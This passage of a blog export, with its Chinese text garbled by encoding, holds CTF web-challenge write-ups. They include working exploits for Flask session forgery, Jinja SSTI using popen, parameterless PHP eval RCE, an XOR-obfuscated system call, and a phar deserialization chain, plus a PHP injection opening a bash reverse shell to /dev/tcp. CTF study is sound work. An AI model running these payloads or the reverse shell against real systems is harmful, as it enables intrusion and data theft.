<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216173217133.png" alt="image-20201216154253806"></p>
<h3 id="web8-è€ƒæ ¸"><a href="#web8-è€ƒæ ¸" class="headerlink" title="web8-è€ƒæ ¸"></a>web8-è€ƒæ ¸</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Only the admin can get the flag,flag in &#x2F;flag</span><br><span class="line"></span><br><span class="line">you name is None</span><br></pre></td></tr></table></figure>

<p>æç¤ºåªæœ‰adminç”¨æˆ·æ‰èƒ½å¤Ÿå¾—åˆ°flagï¼ŒburpæŠ“åŒ…ä¹‹åå‘ç°jwtç¼–ç çš„cookieï¼ŒçŒœæµ‹éœ€è¦jwtä¼ªé€ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xmctf.top:8850&#x2F;?name&#x3D;&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>&#123;&#123;config&#125;&#125;</code>ä¸­å‘ç°äº†å¯†é’¥<code>woshicaiji</code></p>
<p>ç„¶åä½¿ç”¨<code>flask_session_cookie_manager</code>è„šæœ¬ä¼ªé€ æˆadminå³å¯</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216234950487.png" alt="image-20201216235940134"></p>
<p>è¿™é‡Œç»™ä¸ªexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8850/flag&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;session=eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.X9osaw.dYn7Gi00wAWefFCApz5jqOdYjsU&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = r.get(url,headers=headers)</span><br><span class="line">result = response.text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216235940134.png" alt="image-20201217104001551"></p>
<h3 id="web11-è€ƒæ ¸"><a href="#web11-è€ƒæ ¸" class="headerlink" title="web11-è€ƒæ ¸"></a>web11-è€ƒæ ¸</h3><p>æœ¬é¢˜è€ƒå¯Ÿçš„ç‚¹ä¸ºSSTIï¼Œéšæ‰‹è¯•äº†ä¸€ä¸‹å‘ç°<code>?name=kawhi</code>ï¼Œä¼šå›æ˜¾ï¼Œäºæ˜¯fuzzä¸€ä¸‹</p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217104001551.png" alt="image-20201216173217133"></p>
<p>ä¸»è¦è¿‡æ»¤äº†<code>_</code>å’Œ<code>.</code>ï¼Œè¿˜å‘ç°è¿‡æ»¤äº†<code>args</code>ï¼Œå¯ä»¥æƒ³åˆ°ç”¨<code>values</code>ç»•è¿‡ï¼Œä½†ä¸çŸ¥é“ä¸ºä½•æˆ‘ä½¿ç”¨<code>values</code>ç»•è¿‡çš„æ—¶å€™ä¼šæŠ¥ä¸€ä¸ª500çš„é”™è¯¯ï¼Œäºæ˜¯æ­¤æ–¹æ³•ä½œç½¢ï¼Œä½†å¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡ï¼Œå…ˆè·‘è·‘ç´¢å¼•å§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217104536108.png" alt="image-20201217104536108"></p>
<p>è¿™é‡Œä½¿ç”¨è·‘çš„æ˜¯popençš„æ–¹æ³•ï¼Œ<code>os._wrao_close</code>ç´¢å¼•ä¸º117ï¼Œä½†æœ‰ä¸ªå°å‘æœ€åçš„flagæ–‡ä»¶ä¸èƒ½å¤Ÿç›´æ¥è¯»åˆ°ï¼Œä¼šæç¤ºå¦‚ä¸‹ï¼Œä½†å‘ç°base64ç¼–ç åå³å¯è¯»å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;flag&#39; in result !!!Bighack</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç›´æ¥ç»™ä¸ªexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8960/?name=&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&#123;()[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbases\\x5f\\x5f&quot;][0][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[117][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;popen&quot;](&quot;cat /fl4g|base64&quot;)[&quot;read&quot;]()&#125;&#125;&#x27;</span></span><br><span class="line">response = r.get(url+payload)</span><br><span class="line">flag = re.findall(<span class="string">&quot;Hello (.*)&quot;</span>,response.text)[<span class="number">0</span>]</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217112138434.png" alt="image-20201217112138434"></p>
<h3 id="web12-è€ƒæ ¸"><a href="#web12-è€ƒæ ¸" class="headerlink" title="web12-è€ƒæ ¸"></a>web12-è€ƒæ ¸</h3><p>é¢˜ç›®æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>æ¯”è¾ƒç®€å•çš„ä¸€é“é¢˜ï¼Œæ— å‚æ•°RCEï¼Œå…ˆè¯»å–ç›®å½•æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;var_dump(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(6) &#123; [0]&#x3D;&gt; string(1) &quot;.&quot; [1]&#x3D;&gt; string(2) &quot;..&quot; [2]&#x3D;&gt; string(4) &quot;.git&quot; [3]&#x3D;&gt; string(5) &quot;1.php&quot; [4]&#x3D;&gt; string(8) &quot;flag.php&quot; [5]&#x3D;&gt; string(9) &quot;index.php&quot; &#125; </span><br></pre></td></tr></table></figure>

<p>å‘ç°<code>flag.php</code>åœ¨å€’æ•°ç¬¬äºŒä¸ªä½ç½®ä¸Šé¢ï¼Œç”¨åè½¬æ•°ç»„å†<code>next</code>è¯»ä¸‹ä¸€ä¸ªå³å¯</p>
<p>è¿™é‡Œç›´æ¥ç»™ä¸ªexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8873/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));&#x27;</span></span><br><span class="line">response = r.get(url+payload)</span><br><span class="line">flag = re.findall(<span class="string">&quot;0\&quot;&gt;&#x27;(.*)&#x27;&lt;/span&quot;</span>,response.text)[<span class="number">1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217115235793.png" alt="image-20201217115235793"></p>
<h3 id="web4-è€ƒæ ¸"><a href="#web4-è€ƒæ ¸" class="headerlink" title="web4-è€ƒæ ¸"></a>web4-è€ƒæ ¸</h3><p>ä¸€å¼€å§‹æ‰“å¼€é¢˜ç›®å•¥éƒ½æ²¡ï¼Œç»™äº†ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyï¼še086aa137fa19f67d27b39d0eca18610</span><br></pre></td></tr></table></figure>

<p>md5è§£å¯†åä¸ºï¼š1.1.1.1ï¼ŒæŠ“åŒ…åŠ XFFå¤´ï¼š<code>X-Forwarded-For:1.1.1.1</code>ï¼Œç„¶åå°±å¯ä»¥å¾—åˆ°ï¼š<code>dhudndrgrhs.php</code></p>
<p>è®¿é—®å¾—åˆ°é¢˜ç›®æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;print_r&quot;</span>,<span class="string">&quot;system&quot;</span>, <span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;ini_set&quot;</span>, <span class="string">&quot;scandir&quot;</span>, <span class="string">&quot;exec&quot;</span>,<span class="string">&quot;proc_open&quot;</span>, <span class="string">&quot;error_log&quot;</span>, <span class="string">&quot;ini_alter&quot;</span>, <span class="string">&quot;ini_set&quot;</span>, <span class="string">&quot;pfsockopen&quot;</span>, <span class="string">&quot;readfile&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;file_get_contents&quot;</span>, <span class="string">&quot;readlink&quot;</span>, <span class="string">&quot;symlink&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;fpassthru&quot;</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">&#x27;internal&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;xmctf&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]);</span><br></pre></td></tr></table></figure>

<p>æœ¬é¢˜æ•°ç»„åˆå¹¶æŠŠä¸€ä¸ªæ•°ç»„çš„å‡½æ•°å’Œphpçš„å†…ç½®å‡½æ•°ä¸€èµ·ä½œä¸ºé»‘åå•ï¼Œç„¶åæœ‰ä¸ªevalçš„å‚æ•°æ˜¯å¯ä»¥ä»»æ„æ§åˆ¶çš„ï¼Œä¸€çœ‹å°±çŸ¥é“ç”¨æ„é€ æ— å­—ç¬¦å»ç»•è¿‡äº†ï¼Œè¿™ç§é¢˜é‡è§è¿‡å¾ˆå¤šæ¬¡äº†ï¼Œéšä¾¿æ‹¿ä¸ªpayloadæ‰“æ‰“å³å¯</p>
<p>è¿™é‡Œç›´æ¥ç»™ä¸ªexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8979/dhudndrgrhs.php&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?shell=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat flag.php&#x27;</span></span><br><span class="line">response = r.get(url+payload)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217134249722.png" alt="image-20201217134249722"></p>
<h3 id="web6-è€ƒæ ¸"><a href="#web6-è€ƒæ ¸" class="headerlink" title="web6-è€ƒæ ¸"></a>web6-è€ƒæ ¸</h3><p>çœ‹åˆ°é¡µé¢æœ‰ä¸ª<code>download.php</code>ï¼Œæ‰«æç›®å½•æœ‰ä¸ª<code>class.php</code>ï¼Œä½†æ˜¯æœ‰ä¸ªæ­£åˆ™è¿‡æ»¤äº†classï¼Œç”¨æ–œæ ç»•è¿‡å³å¯ä¸‹è½½ä¸‹æ¥ï¼Œæºç å¦‚ä¸‹</p>
<p><code>class.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">        $text = base64_encode(file_get_contents($text));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|flag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆæ‰¾åˆ°æœ‰ä¸ª<code>file.php</code>ï¼Œçœ‹åˆ°æœ‰ä¸ª<code>file_exists</code>ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥ä½¿ç”¨pharåè®®ï¼Œç„¶ååˆæœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œæ»¡è¶³è¿™å‡ ä¸ªæ¡ä»¶çš„è¯pharååºåˆ—åŒ–å…«ä¹ä¸ç¦»åäº†ï¼Œä¸»è¦æ˜¯æ€ä¹ˆæ„é€ ååºåˆ—åŒ–çš„é“¾æ¡</p>
<p>è¿™é‡Œé¦–å…ˆçœ‹åˆ°Showç±»<code>__toString</code>æ–¹æ³•é‡Œé¢æœ‰ä¸ª<code>file_get_contents</code>å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œè¿™ä¸ªåœ°æ–¹åº”è¯¥æ˜¯é“¾æ¡çš„ç»ˆç‚¹ï¼Œç„¶åè°ƒç”¨<code>__toString</code>æ–¹æ³•çš„è¯ä¸€èˆ¬æ˜¯<code>echo</code>å¯¹è±¡æˆ–è€…å­—ç¬¦ä¸²å¯¹æ¯”å•¥çš„ï¼Œç„¶åçœ‹åˆ°S6owç±»æœ‰ä¸ª<code>file_get</code>é‡Œé¢æœ‰ä¸ª<code>echo</code>ï¼Œè¿™é‡Œå¯ä»¥è°ƒç”¨<code>__toString</code>æ–¹æ³•ï¼Œç„¶åå°±è¦æƒ³åŠæ³•è°ƒç”¨<code>file_get</code></p>
<p>è¿™é‡Œå¯ä»¥å…ˆçœ‹åˆ°æœ‰ä¸ª<code>__call</code>å’Œ<code>__get</code>ï¼Œå¯ä»¥é€šè¿‡<code>__get</code>å»è°ƒç”¨<code>file_get</code>ï¼Œç„¶åè°ƒç”¨<code>__get</code>éœ€è¦ä¸å¯è®¿é—®çš„å˜é‡ï¼Œè¿™æ—¶å€™å¯ä»¥ç”¨<code>__call</code>å»è§¦å‘ï¼Œæœ€ååœ¨<code>__call</code>çš„è°ƒç”¨éœ€è¦ç”¨åˆ°<code>Sh0w</code>çš„<code>__destruct</code>ä¸­è®¿é—®<code>_show()</code>ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®strä¸ºS6owï¼Œè€ŒS6owç¼ºå°‘<code>_show()</code>æ–¹æ³•ä»è€Œè°ƒç”¨<code>__call</code></p>
<p>é“¾æ¡åŠ ä¸Šç”Ÿæˆpharæ–‡ä»¶çš„payloadä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=<span class="keyword">new</span> Show();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params[<span class="string">&#x27;_show&#x27;</span>]=<span class="string">&#x27;file_get&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> s6ow();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$Sh0w = <span class="keyword">new</span> Sh0w();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">$phar-&gt;setMetadata($Sh0w); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°†ç”Ÿæˆçš„<code>phar.phar</code>é‡å‘½åä¸º<code>phar.jpg</code>ä¸Šä¼ ï¼Œè®¡ç®—ä¸€ä¸‹md5å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">&#x27;phar.jpg&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//628941e623f5a967093007bf39be805f</span></span><br></pre></td></tr></table></figure>

<p>æœ€ååœ¨<code>file.php</code>ç”¨pharåè®®å»è§¦å‘æˆ‘ä»¬çš„ååºåˆ—åŒ–å³å¯ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xmctf.top:8874&#x2F;file.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;628941e623f5a967093007bf39be805f.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217191850645.png" alt="image-20201217191850645"></p>
<p>base64è§£ç ä¹‹åå³å¯å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmctf&#123;ph4r_s3r1al1z3_1s_fu9!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>è€ƒæ ¸</category>
      </categories>
  </entry>
  <entry>
    <title>WMCTF 2021</title>
    <url>/2021/09/08/WMCTF%202021/</url>
    <content><![CDATA[<p>å¤ç°ä¸€ä¸‹ğŸ™ƒ<a id="more"></a></p>
<h1 id="ez-piwigo"><a href="#ez-piwigo" class="headerlink" title="ez piwigo"></a>ez piwigo</h1><p><code>admin</code>å¼±å£ä»¤ç›´æ¥è¿›å…¥åå°ï¼Œçœ‹åˆ°<code>LocalFiles Editor</code>æ’ä»¶é‡Œçœ‹åˆ°<code>admin.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Piwigo&#x2F;LocalFilesEditor&#x2F;blob&#x2F;96ddd392a14ae2caef3416b379c0868610d2d15f&#x2F;admin.php#L81</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤„çš„<code>eval_syntax</code>å‡½æ•°çš„å‚æ•°å¯æ§ï¼Œè·Ÿè¿›<code>eval_syntax()</code>æ–¹æ³•ï¼Œå‘ç°<code>$code</code>å‚æ•°ä¼šæ‹¼æ¥åˆ°<code>eval</code>å‡½æ•°é‡Œé¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$eval &#x3D; eval(&#39;if(0)&#123;&#39; . $code . &#39;&#125;&#39;);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é—­åˆåŸè¯­å¥æ¥æ³¨å…¥<code>PHP</code>è¯­å¥ï¼Œ<code>payload</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;;system(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip 0&gt;&amp;1&quot;&#x27;</span>);<span class="keyword">if</span>(<span class="number">0</span>)&#123;</span><br></pre></td></tr></table></figure>

<h1 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h1><h2 id="å®˜æ–¹è§£æ³•"><a href="#å®˜æ–¹è§£æ³•" class="headerlink" title="å®˜æ–¹è§£æ³•"></a>å®˜æ–¹è§£æ³•</h2><p>é¦–å…ˆæœ¬é¢˜<code>F12</code>è¿›å…¥<code>/view</code>ä¹‹åå¯ä»¥çœ‹åˆ°æ¨¡æ¿</p>
